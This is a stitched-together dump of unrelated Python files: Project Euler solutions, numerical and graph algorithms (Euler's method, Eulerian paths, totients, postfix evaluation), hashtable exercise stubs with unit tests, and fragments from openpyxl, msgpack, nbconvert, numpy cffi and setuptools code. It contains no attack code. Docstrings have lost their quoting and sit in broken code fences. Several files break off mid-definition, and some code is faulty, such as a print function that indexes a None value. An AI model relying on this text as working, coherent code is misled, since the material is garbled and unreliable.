nCr = n! / r!(n−r)! ,where r ≤ n, n! = n×(n−1)×...×3×2×1, and 0! = 1.

It is not until n = 23, that a value exceeds one-million: 23C10 = 1144066.

How many, not necessarily distinct, values of  nCr, for 1 ≤ n ≤ 100, are
greater than one-million?```


```py
from math import factorial


def combinations_greater(nlimit, target_max):
    result = []
    for n in range(1, nlimit + 1):
        for r in range(2, n):
            combinations = factorial(n) // (factorial(r) * factorial(n - r))
            if combinations > target_max:
                result.append((n, r, combinations))
    return result


def test():
    assert [(5, 2, 10), (5, 3, 10)] == combinations_greater(5, 9)


def run():
    assert 4075 == len(combinations_greater(100, 10 ** 6))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python
# -*- encoding:utf-8 -*-
````

````py
Solution to Project Euler Problem 56
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/


A googol (10**100) is a massive number: one followed by one-hundred zeros; 100**100 is almost unimaginably large: one followed by two-hundred zeros. Despite their size, the sum of the digits in each number is only 1.

Considering natural numbers of the form, a**b, where a, b  100, what is the maximum digital sum?```


```py
from digits import digits

def sumdigits(n):
    return sum(digits(n))

def max_digit_sum(alimit, blimit):
    result = 0
    amax = 0
    bmax = 0
    for a in xrange(2,alimit):
        for b in xrange(2,blimit):
            s = sumdigits(a**b)
            if s > result:
                result = s
                amax = a
                bmax = b
    return result, amax, bmax

def test():
    assert 1 == sumdigits(100**100)
    assert (45, 9, 7)  == max_digit_sum(10,10)

def run():
    print max_digit_sum(100,100)

if __name__ == '__main__':
    test()
    run()

#!/usr/bin/env python
# -*- encoding:utf-8 -*-
````

````py
Solution to Project Euler Problem 57
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

It is possible to show that the square root of two can be expressed as an infinite continued fraction.

 2 = 1 + 1/(2 + 1/(2 + 1/(2 + ... ))) = 1.414213...

By expanding this for the first four iterations, we get:

1 + 1/2 = 3/2 = 1.5
1 + 1/(2 + 1/2) = 7/5 = 1.4
1 + 1/(2 + 1/(2 + 1/2)) = 17/12 = 1.41666...
1 + 1/(2 + 1/(2 + 1/(2 + 1/2))) = 41/29 = 1.41379...

The next three expansions are 99/70, 239/169, and 577/408, but the eighth expansion, 1393/985, is the first example where the number of digits in the numerator exceeds the number of digits in the denominator.

In the first one-thousand expansions, how many fractions contain a numerator with more digits than denominator?```


```py
from fractions import Fraction as frac

def root2_continued_fraction(iters):
    a = 1
    for _ in xrange(iters):
        a = 1 + frac(1, 1+a)
        yield a

def dlen(n):
    return len(str(n))

def test():
    first4 = [frac(3,2),frac(7,5),frac(17,12),frac(41,29)]
    assert first4 == list(root2_continued_fraction(4))

def run():
    expansion = root2_continued_fraction(1000)
    print sum(dlen(f.numerator) > dlen(f.denominator) for f in expansion)

if __name__ == '__main__':
    test()
    run()

#!/usr/bin/env python
# -*- encoding:utf-8 -*-
````

````py
Solution to Project Euler Problem
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

Starting with 1 and spiralling anticlockwise in the following way, a square spiral with side length 7 is formed.

37 36 35 34 33 32 31
38 17 16 15 14 13 30
39 18  5  4  3 12 29
40 19  6  1  2 11 28
41 20  7  8  9 10 27
42 21 22 23 24 25 26
43 44 45 46 47 48 49

It is interesting to note that the odd squares lie along the bottom right diagonal, but what is more interesting is that 8 out of the 13 numbers lying along both diagonals are prime; that is, a ratio of 8/13  62%.

If one complete new layer is wrapped around the spiral above, a square spiral with side length 9 will be formed. If this process is continued, what is the side length of the square spiral for which the ratio of primes along both diagonals first falls below 10%?```


```py
from spirals import spiral_diagonal_numbers
from primality import is_prime

def find_sides_for_prime_ratio(target_ratio, min_side_len=0):
    numbers = spiral_diagonal_numbers()
    numbers.next()
    count = 1
    primes = 0
    ratio = 0.0
    while True:
        for _ in xrange(4):
            n, side_len, _ = numbers.next()
            count += 1
            if is_prime(n):
                primes += 1
        ratio = primes/float(count)
        if ratio < target_ratio and side_len >= min_side_len:
            return side_len, ratio, primes, count

def test():
    assert 0.62 == round(find_sides_for_prime_ratio(0.62, 7)[1], 2)

def run():
    print find_sides_for_prime_ratio(0.10)

if __name__ == '__main__':
    test()
    run()

#!/usr/bin/env python
# -*- encoding:utf-8 -*-
````

````py
Solution to Project Euler Problem 67
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/


By starting at the top of the triangle below and moving to adjacent numbers on
the row below, the maximum total from top to bottom is 23.

3
7 4
2 4 6
8 5 9 3

That is, 3 + 7 + 4 + 9 = 23.

Find the maximum total from top to bottom in triangle.txt (right click and
'Save Link/Target As...'), a 15K text file containing a triangle with
one-hundred rows.

NOTE: This is a much more difficult version of Problem 18. It is not possible
to try every route to solve this problem, as there are 299 altogether! If you
could check one trillion (1012) routes every second it would take over twenty
billion years to check them all. There is an efficient algorithm to solve it.
;o)```


```py

import euler018

STRIANGLE = open('data/triangle.txt', 'r').read()
LINES = [s.split() for s in STRIANGLE.strip().split('\n')]
TRIANGLE = [[int(s) for s in line] for line in LINES]

def test():
    euler018.test()

if __name__ == '__main__':
    test()
    print euler018.max_path_value_sweep(TRIANGLE)

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 81
https://projecteuler.net/problem=81

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

In the 5 by 5 matrix below, the minimal path sum from the top left to the bottom
right, by only moving to the right and down, is indicated in bold red and is
equal to 2427.


131 673 234 103 18
201 96 342 965 150
630 803 746 422 111
537 699 497 121 956
805 732 524 37 331

Find the minimal path sum, in matrix.txt (right click and 'Save Link/Target
As...'), a 31K text file containing a 80 by 80 matrix, from the top left to the
bottom right by only moving right and down.```


```py
from pathlib import Path
from copy import deepcopy
import csv


FILENAME = Path(__file__).parent / "../data/matrix.txt"


MATRIX = [[int(c) for c in line] for line in csv.reader(open(FILENAME))]


TEST_DATA = [
    [131, 673, 234, 103, 18],
    [201, 96, 342, 965, 150],
    [630, 803, 746, 422, 111],
    [537, 699, 497, 121, 956],
    [805, 732, 524, 37, 331],
]


def reduce_min_path(matrix, reducer=min):
    T = deepcopy(matrix)
    ibot = len(T) - 1
    # reduce the right column moving down
    for i in range(ibot - 1, -1, -1):
        if len(T[i + 1]) < len(T[i]):
            continue
        j = len(T[i]) - 1
        T[i][j] += T[i + 1][j]
    # reduce the bottom row moving right
    for j in range(len(T[ibot]) - 2, -1, -1):
        T[ibot][j] += T[ibot][j + 1]
    # reduce the rest of the matrix
    for i in range(ibot - 1, -1, -1):
        for j in range(len(T[i]) - 2, -1, -1):
            T[i][j] += reducer(T[i + 1][j], T[i][j + 1])
    return T[0][0]


def test():
    assert 2427 == reduce_min_path(TEST_DATA)


def run():
    assert 427337 == reduce_min_path(MATRIX)


if __name__ == "__main__":
    test()
    run()

import numpy as np


def explicit_euler(ode_func, y0, x0, step_size, x_end):
    """
    Calculate numeric solution at each step to an ODE using Euler's Method

    https://en.wikipedia.org/wiki/Euler_method

    Arguments:
    ode_func -- The ode as a function of x and y
    y0 -- the initial value for y
    x0 -- the initial value for x
    stepsize -- the increment value for x
    x_end -- the end value for x

    >>> # the exact solution is math.exp(x)
    >>> def f(x, y):
    ...     return y
    >>> y0 = 1
    >>> y = explicit_euler(f, y0, 0.0, 0.01, 5)
    >>> y[-1]
    144.77277243257308
    """
    N = int(np.ceil((x_end - x0) / step_size))
    y = np.zeros((N + 1,))
    y[0] = y0
    x = x0

    for k in range(N):
        y[k + 1] = y[k] + step_size * ode_func(x, y[k])
        x += step_size

    return y


if __name__ == "__main__":
    import doctest

    doctest.testmod()

# Eulerian Path is a path in graph that visits every edge exactly once.
# Eulerian Circuit is an Eulerian Path which starts and ends on the same
# vertex.
# time complexity is O(V+E)
# space complexity is O(VE)


# using dfs for finding eulerian path traversal
def dfs(u, graph, visited_edge, path=[]):
    path = path + [u]
    for v in graph[u]:
        if visited_edge[u][v] is False:
            visited_edge[u][v], visited_edge[v][u] = True, True
            path = dfs(v, graph, visited_edge, path)
    return path


# for checking in graph has euler path or circuit
def check_circuit_or_path(graph, max_node):
    odd_degree_nodes = 0
    odd_node = -1
    for i in range(max_node):
        if i not in graph.keys():
            continue
        if len(graph[i]) % 2 == 1:
            odd_degree_nodes += 1
            odd_node = i
    if odd_degree_nodes == 0:
        return 1, odd_node
    if odd_degree_nodes == 2:
        return 2, odd_node
    return 3, odd_node


def check_euler(graph, max_node):
    visited_edge = [[False for _ in range(max_node + 1)] for _ in range(max_node + 1)]
    check, odd_node = check_circuit_or_path(graph, max_node)
    if check == 3:
        print("graph is not Eulerian")
        print("no path")
        return
    start_node = 1
    if check == 2:
        start_node = odd_node
        print("graph has a Euler path")
    if check == 1:
        print("graph has a Euler cycle")
    path = dfs(start_node, graph, visited_edge)
    print(path)


def main():
    G1 = {1: [2, 3, 4], 2: [1, 3], 3: [1, 2], 4: [1, 5], 5: [4]}
    G2 = {1: [2, 3, 4, 5], 2: [1, 3], 3: [1, 2], 4: [1, 5], 5: [1, 4]}
    G3 = {1: [2, 3, 4], 2: [1, 3, 4], 3: [1, 2], 4: [1, 2, 5], 5: [4]}
    G4 = {1: [2, 3], 2: [1, 3], 3: [1, 2]}
    G5 = {
        1: [],
        2: []
        # all degree is zero
    }
    max_node = 10
    check_euler(G1, max_node)
    check_euler(G2, max_node)
    check_euler(G3, max_node)
    check_euler(G4, max_node)
    check_euler(G5, max_node)


if __name__ == "__main__":
    main()

#!/usr/bin/python
# -*- coding: utf-8 -*-


# By formula derived by Euler(A great mathematician)
print("Euler's Formula: F(faces) + V(vertices) = E(Edges)+2\n")

# Further derivation
print("Derivation 1: E(Edges) = F(faces)+V(vertices) - 2")
print("Derivation 2: V(vertices) = E(edges)+2 - F(Faces)")
print("Derivation 3: F(faces) = E(edges)+2 - V(vertices)")


# By order of operations, parenthesis can be added
# for ensuring, but not needed
def E(f, v):
    return f + v - 2


def V(e, f):
    return e + 2 - f


def F(e, v):
    return e + 2 - v


# function to evaluate
# By default datatype of raw_input() is string
user = raw_input("\nE, V or F: ").upper()
print(" ")


# evaluating function asked by user
if user == "E":
    print("\nEdges: " + str(E(input("Faces: "), input("Vertices: "))))
elif user == "V":
    print("\nVertices: " + str(V(input("Edges: "), input("Faces: "))))
elif user == "F":
    print("\nFaces: " + str(F(input("Edges: "), input("Vertices: "))))
else:
    print("Invalid Input, Try again!")


# A while loop can be added
# to perform multiple calculations

# Eulers Totient function finds the number of relative primes of a number n from 1 to n
def totient(n: int) -> list:
    is_prime = [True for i in range(n + 1)]
    totients = [i - 1 for i in range(n + 1)]
    primes = []
    for i in range(2, n + 1):
        if is_prime[i]:
            primes.append(i)
        for j in range(0, len(primes)):
            if i * primes[j] >= n:
                break
            is_prime[i * primes[j]] = False

            if i % primes[j] == 0:
                totients[i * primes[j]] = totients[i] * primes[j]
                break

            totients[i * primes[j]] = totients[i] * (primes[j] - 1)

    return totients


def test_totient() -> None:
    """
    >>> n = 10
    >>> totient_calculation = totient(n)
    >>> for i in range(1, n):
    ...     print(f"{i} has {totient_calculation[i]} relative primes.")
    1 has 0 relative primes.
    2 has 1 relative primes.
    3 has 2 relative primes.
    4 has 2 relative primes.
    5 has 4 relative primes.
    6 has 2 relative primes.
    7 has 6 relative primes.
    8 has 4 relative primes.
    9 has 6 relative primes.
    """
    pass


if __name__ == "__main__":
    import doctest

    doctest.testmod()

from typing import Any, List
````

````py
The Reverse Polish Nation also known as Polish postfix notation
or simply postfix notation.
https://en.wikipedia.org/wiki/Reverse_Polish_notation
Classic examples of simple stack implementations
Valid operators are +, -, *, /.
Each operand may be an integer or another expression.```


```py


def evaluate_postfix(postfix_notation: list) -> int:
    """
    >>> evaluate_postfix(["2", "1", "+", "3", "*"])
    9
    >>> evaluate_postfix(["4", "13", "5", "/", "+"])
    6
    >>> evaluate_postfix([])
    0
    """
    if not postfix_notation:
        return 0

    operations = {"+", "-", "*", "/"}
    stack: List[Any] = []

    for token in postfix_notation:
        if token in operations:
            b, a = stack.pop(), stack.pop()
            if token == "+":
                stack.append(a + b)
            elif token == "-":
                stack.append(a - b)
            elif token == "*":
                stack.append(a * b)
            else:
                if a * b < 0 and a % b != 0:
                    stack.append(a // b + 1)
                else:
                    stack.append(a // b)
        else:
            stack.append(int(token))

    return stack.pop()


if __name__ == "__main__":
    import doctest

    doctest.testmod()

def even_occuring_element(arr):
    """Returns the even occuring element within a list of integers"""

    dict = {}
    for num in arr:
        if num in dict:
            dict[num] += 1
        else:
            dict[num] = 1

    for num in dict:
        if not dict[num] & 1:  # bitwise check for parity.
            return num

def evenDigitsOnly(n):
    digits = [int(digit) for digit in str(n)]  # Convert digits to list of strings

    for digit in digits:
        if digit % 2 == 1:
            return False
    return True

def even_odd_count(filename):
    import os

    fp = os.path.join(os.getcwd(), filename)

    with open(fp, "r") as data:
        stack = []
        for line in data:
            #  Push each int to stack
            stack.extend([int(num) for num in line.split()])

        even_count = 0
        odd_count = 0
        for num in stack:
            #  If the last bit is 1
            #  increment odd_count
            if num & 1:
                odd_count += 1
            else:
                even_count += 1

        #  Returns a tuple (index 0 -> event, index 1 -> odd)
        return even_count, odd_count


fn = "numbers.txt"
print("Even numbers in the file list:", even_odd_count(fn)[0])
print("Odd numbers in the file list:", even_odd_count(fn)[1])
````

````py
You are given a tree(a simple connected graph with no cycles). The tree has N
nodes numbered from 1 to N and is rooted at node 1.

Find the maximum number of edges you can remove from the tree to get a forest
such that each connected component of the forest contains an even number of
nodes.

Constraints
2 <= 2 <= 100

Note: The tree input will be such that it can always be decomposed into
components containing an even number of nodes.```


```py
# pylint: disable=invalid-name
from collections import defaultdict


def dfs(start: int) -> int:
    """DFS traversal"""
    # pylint: disable=redefined-outer-name
    ret = 1
    visited[start] = True
    for v in tree[start]:
        if v not in visited:
            ret += dfs(v)
    if ret % 2 == 0:
        cuts.append(start)
    return ret


def even_tree():
    """
    2 1
    3 1
    4 3
    5 2
    6 1
    7 2
    8 6
    9 8
    10 8
    On removing edges (1,3) and (1,6), we can get the desired result 2.
    """
    dfs(1)


if __name__ == "__main__":
    n, m = 10, 9
    tree = defaultdict(list)
    visited: dict[int, bool] = {}
    cuts: list[int] = []
    count = 0
    edges = [(2, 1), (3, 1), (4, 3), (5, 2), (6, 1), (7, 2), (8, 6), (9, 8), (10, 8)]
    for u, v in edges:
        tree[u].append(v)
        tree[v].append(u)
    even_tree()
    print(len(cuts) - 1)

#  Hint:  You may not need all of these.  Remove the unused functions.
from hashtables import (
    HashTable,
    hash_table_insert,
    hash_table_remove,
    hash_table_retrieve,
    hash_table_resize,
)


def get_indices_of_item_weights(weights, length, limit):
    ht = HashTable(16)

    """
    YOUR CODE HERE
    """

    return None


def print_answer(answer):
    if answer is None:
        print(str(answer[0] + " " + answer[1]))
    else:
        print("None")

import unittest

from ex1 import get_indices_of_item_weights


class TestEx1(unittest.TestCase):
    def test_ex1_1(self):
        weights_1 = [9]
        answer_1 = get_indices_of_item_weights(weights_1, 1, 9)
        self.assertTrue(answer_1 is None)

    def test_ex1_2(self):
        weights_2 = [4, 4]
        answer_2 = get_indices_of_item_weights(weights_2, 2, 8)
        self.assertTrue(answer_2[0] == 1)
        self.assertTrue(answer_2[1] == 0)

    def test_ex1_3(self):
        weights_3 = [4, 6, 10, 15, 16]
        answer_3 = get_indices_of_item_weights(weights_3, 5, 21)
        self.assertTrue(answer_3[0] == 3)
        self.assertTrue(answer_3[1] == 1)

    def test_ex1_4(self):
        weights_4 = [12, 6, 7, 14, 19, 3, 0, 25, 40]
        answer_4 = get_indices_of_item_weights(weights_4, 9, 7)
        self.assertTrue(answer_4[0] == 6)
        self.assertTrue(answer_4[1] == 2)


if __name__ == "__main__":
    unittest.main()

#  Hint:  You may not need all of these.  Remove the unused functions.
from hashtables import (
    HashTable,
    hash_table_insert,
    hash_table_remove,
    hash_table_retrieve,
    hash_table_resize,
)


class Ticket:
    def __init__(self, source, destination):
        self.source = source
        self.destination = destination


def reconstruct_trip(tickets, length):
    hashtable = HashTable(length)
    route = [None] * length

    """
    YOUR CODE HERE
    """

    return route

import unittest

from ex2 import Ticket, reconstruct_trip


class TestEx2(unittest.TestCase):
    def test_short_case(self):
        ticket_1 = Ticket("NONE", "PDX")
        ticket_2 = Ticket("PDX", "DCA")
        ticket_3 = Ticket("DCA", "NONE")

        tickets = [ticket_1, ticket_2, ticket_3]

        expected = ["PDX", "DCA", "NONE"]
        result = reconstruct_trip(tickets, 3)

        self.assertTrue(expected == result)

    def test_long_case(self):
        ticket_1 = Ticket("PIT", "ORD")
        ticket_2 = Ticket("XNA", "SAP")
        ticket_3 = Ticket("SFO", "BHM")
        ticket_4 = Ticket("FLG", "XNA")
        ticket_5 = Ticket("NONE", "LAX")
        ticket_6 = Ticket("LAX", "SFO")
        ticket_7 = Ticket("SAP", "SLC")
        ticket_8 = Ticket("ORD", "NONE")
        ticket_9 = Ticket("SLC", "PIT")
        ticket_10 = Ticket("BHM", "FLG")

        tickets = [
            ticket_1,
            ticket_2,
            ticket_3,
            ticket_4,
            ticket_5,
            ticket_6,
            ticket_7,
            ticket_8,
            ticket_9,
            ticket_10,
        ]

        expected = [
            "LAX",
            "SFO",
            "BHM",
            "FLG",
            "XNA",
            "SAP",
            "SLC",
            "PIT",
            "ORD",
            "NONE",
        ]
        result = reconstruct_trip(tickets, 10)

        self.assertTrue(expected == result)


if __name__ == "__main__":
    unittest.main()

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.
#
#
#                         All Rights Reserved
#

#

```









---


```py


# end_pymotw_header
DATA = "This is example B"
````

````pyExceptions for marking tests as skipped or deprecated.

This module exists to provide backwards compatibility with previous
versions of nose where skipped and deprecated tests were core
functionality, rather than being provided by plugins. It may be
removed in a future release.```


```py
from nose.plugins.skip import SkipTest
from nose.plugins.deprecated import DeprecatedTest

from openpyxl import Workbook
from openpyxl.utils import get_column_letter
from openpyxl.styles import Font

# making the grid and giving the data
data = {
    "Joe": {"math": 65, "science": 78, "english": 98, "gym": 89},
    "Bill": {"math": 55, "science": 72, "english": 87, "gym": 95},
    "Tim": {"math": 100, "science": 45, "english": 75, "gym": 92},
    "Sally": {"math": 30, "science": 25, "english": 45, "gym": 100},
    "Jane": {"math": 100, "science": 100, "english": 100, "gym": 60},
}

wb = Workbook()
ws = wb.active
ws.title = "Grades"

headings = ["Name"] + list(data["Joe"].keys())
ws.append(headings)

# reading the data for persom
for person in data:
    grades = list(data[person].values())
    ws.append([person] + grades)

for col in range(2, len(data["Joe"]) + 2):
    char = get_column_letter(col)
    ws[char + "7"] = f"=SUM({char + '2'}:{char + '6'})/{len(data)}"

for col in range(1, 6):
    ws[get_column_letter(col) + "1"].font = Font(bold=True, color="0099CCFF")

# saving the excel file in the same folder
wb.save("NewGrades.xlsx")

class UnpackException(Exception):
    """Base class for some exceptions raised while unpacking.

    NOTE: unpack may raise exception other than subclass of
    UnpackException.  If you want to catch all error, catch
    Exception instead.
    """


class BufferFull(UnpackException):
    pass


class OutOfData(UnpackException):
    pass


class FormatError(ValueError, UnpackException):
    """Invalid msgpack format"""


class StackError(ValueError, UnpackException):
    """Too nested"""


# Deprecated.  Use ValueError instead
UnpackValueError = ValueError


class ExtraData(UnpackValueError):
    """ExtraData is raised when there is trailing data.

    This exception is raised while only one-shot (not streaming)
    unpack.
    """

    def __init__(self, unpacked, extra):
        self.unpacked = unpacked
        self.extra = extra

    def __str__(self):
        return "unpack(b) received extra data."


# Deprecated.  Use Exception instead to catch all exception during packing.
PackException = Exception
PackValueError = ValueError
PackOverflowError = OverflowError
````

````py
Module containing a preprocessor tto execute code cells, updating time metadata```


```py

from datetime import datetime

from nbconvert.preprocessors.execute import ExecutePreprocessor

try:
    # notebook >= 5.0.0-rc1
    import notebook._tz as nbtz
except ImportError:
    # notebook < 5.0.0-rc1
    import notebook.services.contents.tz as nbtz


class ExecuteTimePreprocessor(ExecutePreprocessor):
    """
    Executes all the cells in a notebook, updating their ExecuteTime metadata.
    """

    def run_cell(self, cell, cell_index, *args, **kwargs):
        before = datetime.utcnow()
        exec_reply, outs = super(ExecuteTimePreprocessor, self).run_cell(
            cell, cell_index, *args, **kwargs
        )

        if exec_reply.get("msg_type", "") == "execute_reply":
            ets = cell.setdefault("metadata", {}).setdefault("ExecuteTime", {})
            if "started" in exec_reply.get("metadata", {}):
                # started value should is already a string, so don't isoformat
                ets["start_time"] = exec_reply["metadata"]["started"]
            else:
                # attempt to fallback to datetime obj for execution request msg
                ets["start_time"] = (
                    exec_reply.get("parent_header", {}).get("date", before).isoformat()
                )
            ets["end_time"] = (
                exec_reply.get("header", {}).get("date") or nbtz.utcnow()
            ).isoformat()

        return exec_reply, outs

def find(arr, search, n):
    for i in range(n):
        if arr[i] == search:
            return True
            break


arr = [1, 2, 3, 4, 5, 6]
search = 4

print(find(arr, search, 6))
````

````py
Author: OMKAR PATHAK
Created On: 26th August 2017

 - Best O(1)
 - Average O(logn)
 - Worst O(logn)

 More info: https://en.wikipedia.org/wiki/Exponential_search```


```py

from __future__ import division
import inspect


def binary_search(_list, left, right, target):
    if right >= left:
        mid = (left + right) // 2

        # if element is present at the mid itself
        if _list[mid] == target:
            return mid

        # If the element is smaller than mid, then it
        # can only be present in the left subarray
        if _list[mid] > target:
            return binary_search(_list, left, mid - 1, target)

        # Else the element can only be present in the right
        return binary_search(_list, mid + 1, right, target)

    return False


def search(_list, target):
    """
    This function performs a exponential search
    on a sorted list and returns the index
    of item if successful else returns False

    :param _list: list to search
    :param target: item to search for
    :return: index of item if successful else returns False
    """

    if type(_list) is not list:
        raise TypeError(
            "Exponential search only excepts lists, not {}".format(str(type(_list)))
        )

    # is target is at the first position itself
    if _list[0] == target:
        return 0

    # Find range for binary seaarch by repeated doubling
    i = 1
    while i < len(_list) and _list[i] <= target:
        i = i * 2

    return binary_search(_list, i // 2, min(i, len(_list)), target)


def time_complexities():
    """
    Return information on functions
    time complexity
    :return: string
    """
    return "Best Case: O(1), Average Case: O(logn), Worst Case: O(logn)"


def get_code():
    """
    easily retrieve the source code
    of the function
    :return: source code
    """
    return inspect.getsource(search)
````

```pyNbconvert exporter to inline css & js for collapsible_headings."""

from __future__ import print_function

from nbconvert.exporters.html import HTMLExporter
from traitlets import Dict


class ExporterInliner(HTMLExporter):

    inliner_resources = Dict(
        {"css": [], "js": []},
        config=True,
        help="css and js scripts to wrap in html <style> or <script> tags",
    )

    def _template_file_default(self):
        return "inliner"

    def from_notebook_node(self, nb, resources=None, **kw):

        # ensure resources used by template actually exist, add in any from
        # config
        if resources is None:
            resources = {}
        inliner_resources = resources.setdefault("inliner", {})
        for tt in ("css", "js"):
            existing_items = inliner_resources.setdefault(tt, [])
            existing_items += [
                item
                for item in self.inliner_resources[tt]
                if item not in existing_items
            ]

        return super(ExporterInliner, self).from_notebook_node(nb, resources, **kw)

    @property
    def default_config(self):
        c = super(ExporterInliner, self).default_config
        #  import here to avoid circular import
        from jupyter_contrib_nbextensions.nbconvert_support import templates_directory

        contrib_templates_dir = templates_directory()

        template_path = c.TemplateExporter.setdefault("template_path", [])
        if contrib_templates_dir not in template_path:
            template_path.append(contrib_templates_dir)

        return c
```

````py
This module shows how to create new integers by applying math expressions
on existing integers.```


```py


def main():
    # This is a simple integer
    x = 1

    # Its value can be used as part of expressions
    assert x + 1 == 2

    # An expression can be chained indefinitely. This concept of chaining
    # expressions is powerful because it allows us to compose simple pieces
    # of code into larger pieces of code over time
    assert x * 2 * 2 * 2 == 8

    # Division is tricky because Python 3.x returns 0.5 of type `float`
    # whereas Python 2.x returns 0 of type `int`. If this line fails, it
    # is a sign that the wrong version of Python was used
    assert x / 2 == 0.5

    # If an integer division is desired, then an extra slash must be
    # added to the expression. In Python 2.x and Python 3.x, the behavior
    # is exactly the same
    assert x // 2 == 0

    # Powers of an integer can be leveraged too. If more features are
    # needed, then leverage the builtin `math` library or a third-party
    # library. Otherwise, we have to build our own math library
    assert x * 2 ** 3 == 8


if __name__ == "__main__":
    main()
````

````py
Extended Euclidean Algorithm.

Finds 2 numbers a and b such that it satisfies
the equation am + bn = gcd(m, n) (a.k.a Bezout's Identity)

https://en.wikipedia.org/wiki/Extended_Euclidean_algorithm```


```py

# @Author: S. Sharma <silentcat>
# @Date:   2019-02-25T12:08:53-06:00
# @Email:  silentcat@protonmail.com
# @Last modified by:   pikulet
# @Last modified time: 2020-10-02

import sys
from typing import Tuple


def extended_euclidean_algorithm(a: int, b: int) -> Tuple[int, int]:
    """
    Extended Euclidean Algorithm.

    Finds 2 numbers a and b such that it satisfies
    the equation am + bn = gcd(m, n) (a.k.a Bezout's Identity)

    >>> extended_euclidean_algorithm(1, 24)
    (1, 0)

    >>> extended_euclidean_algorithm(8, 14)
    (2, -1)

    >>> extended_euclidean_algorithm(240, 46)
    (-9, 47)

    >>> extended_euclidean_algorithm(1, -4)
    (1, 0)

    >>> extended_euclidean_algorithm(-2, -4)
    (-1, 0)

    >>> extended_euclidean_algorithm(0, -4)
    (0, -1)

    >>> extended_euclidean_algorithm(2, 0)
    (1, 0)

    """
    # base cases
    if abs(a) == 1:
        return a, 0
    elif abs(b) == 1:
        return 0, b

    old_remainder, remainder = a, b
    old_coeff_a, coeff_a = 1, 0
    old_coeff_b, coeff_b = 0, 1

    while remainder != 0:
        quotient = old_remainder // remainder
        old_remainder, remainder = remainder, old_remainder - quotient * remainder
        old_coeff_a, coeff_a = coeff_a, old_coeff_a - quotient * coeff_a
        old_coeff_b, coeff_b = coeff_b, old_coeff_b - quotient * coeff_b

    # sign correction for negative numbers
    if a < 0:
        old_coeff_a = -old_coeff_a
    if b < 0:
        old_coeff_b = -old_coeff_b

    return old_coeff_a, old_coeff_b


def main():
    """Call Extended Euclidean Algorithm."""
    if len(sys.argv) < 3:
        print("2 integer arguments required")
        exit(1)
    a = int(sys.argv[1])
    b = int(sys.argv[2])
    print(extended_euclidean_algorithm(a, b))


if __name__ == "__main__":
    main()

import numpy as np

reveal_type(np.uint128())
reveal_type(np.uint256())

reveal_type(np.int128())
reveal_type(np.int256())

reveal_type(np.float80())
reveal_type(np.float96())
reveal_type(np.float128())
reveal_type(np.float256())

reveal_type(np.complex160())
reveal_type(np.complex192())
reveal_type(np.complex256())
reveal_type(np.complex512())
````

````py
Use cffi to access any of the underlying C functions from distributions.h```


```py
import os
import numpy as np
import cffi
from .parse import parse_distributions_h

ffi = cffi.FFI()

inc_dir = os.path.join(np.get_include(), "numpy")

# Basic numpy types
ffi.cdef(
    """
    typedef intptr_t npy_intp;
    typedef unsigned char npy_bool;
````

````py
)

parse_distributions_h(ffi, inc_dir)

lib = ffi.dlopen(np.random._generator.__file__)

# Compare the distributions.h random_standard_normal_fill to
# Generator.standard_random
bit_gen = np.random.PCG64()
rng = np.random.Generator(bit_gen)
state = bit_gen.state

interface = rng.bit_generator.cffi
n = 100
vals_cffi = ffi.new("double[%d]" % n)
lib.random_standard_normal_fill(interface.bit_generator, n, vals_cffi)

# reset the state
bit_gen.state = state

vals = rng.standard_normal(n)

for i in range(n):
    assert vals[i] == vals_cffi[i]

r"""
Building the required library in this example requires a source distribution
of NumPy or clone of the NumPy git repository since distributions.c is not
included in binary distributions.

On *nix, execute in numpy/random/src/distributions

export ${PYTHON_VERSION}=3.8 # Python version
export PYTHON_INCLUDE=#path to Python's include folder, usually \
    ${PYTHON_HOME}/include/python${PYTHON_VERSION}m
export NUMPY_INCLUDE=#path to numpy's include folder, usually \
    ${PYTHON_HOME}/lib/python${PYTHON_VERSION}/site-packages/numpy/core/include
gcc -shared -o libdistributions.so -fPIC distributions.c \
    -I${NUMPY_INCLUDE} -I${PYTHON_INCLUDE}
mv libdistributions.so ../../_examples/numba/

On Windows

rem PYTHON_HOME and PYTHON_VERSION are setup dependent, this is an example
set PYTHON_HOME=c:\Anaconda
set PYTHON_VERSION=38
cl.exe /LD .\distributions.c -DDLL_EXPORT \
    -I%PYTHON_HOME%\lib\site-packages\numpy\core\include \
    -I%PYTHON_HOME%\include %PYTHON_HOME%\libs\python%PYTHON_VERSION%.lib
move distributions.dll ../../_examples/numba/```


```py
import os

import numba as nb
import numpy as np
from cffi import FFI

from numpy.random import PCG64

ffi = FFI()
if os.path.exists("./distributions.dll"):
    lib = ffi.dlopen("./distributions.dll")
elif os.path.exists("./libdistributions.so"):
    lib = ffi.dlopen("./libdistributions.so")
else:
    raise RuntimeError("Required DLL/so file was not found.")

ffi.cdef(
    """
double random_standard_normal(void *bitgen_state);```


```py
)
x = PCG64()
xffi = x.cffi
bit_generator = xffi.bit_generator

random_standard_normal = lib.random_standard_normal


def normals(n, bit_generator):
    out = np.empty(n)
    for i in range(n):
        out[i] = random_standard_normal(bit_generator)
    return out


normalsj = nb.jit(normals, nopython=True)

# Numba requires a memory address for void *
# Can also get address from x.ctypes.bit_generator.value
bit_generator_address = int(ffi.cast("uintptr_t", bit_generator))

norm = normalsj(1000, bit_generator_address)
print(norm[:12])

import re
import functools
import distutils.core
import distutils.errors
import distutils.extension

from .monkey import get_unpatched


def _have_cython():
    """
    Return True if Cython can be imported.
    """
    cython_impl = "Cython.Distutils.build_ext"
    try:
        # from (cython_impl) import build_ext
        __import__(cython_impl, fromlist=["build_ext"]).build_ext
        return True
    except Exception:
        pass
    return False


# for compatibility
have_pyrex = _have_cython

_Extension = get_unpatched(distutils.core.Extension)


class Extension(_Extension):
    """Extension that uses '.c' files in place of '.pyx' files"""

    def __init__(self, name, sources, *args, **kw):
        # The *args is needed for compatibility as calls may use positional
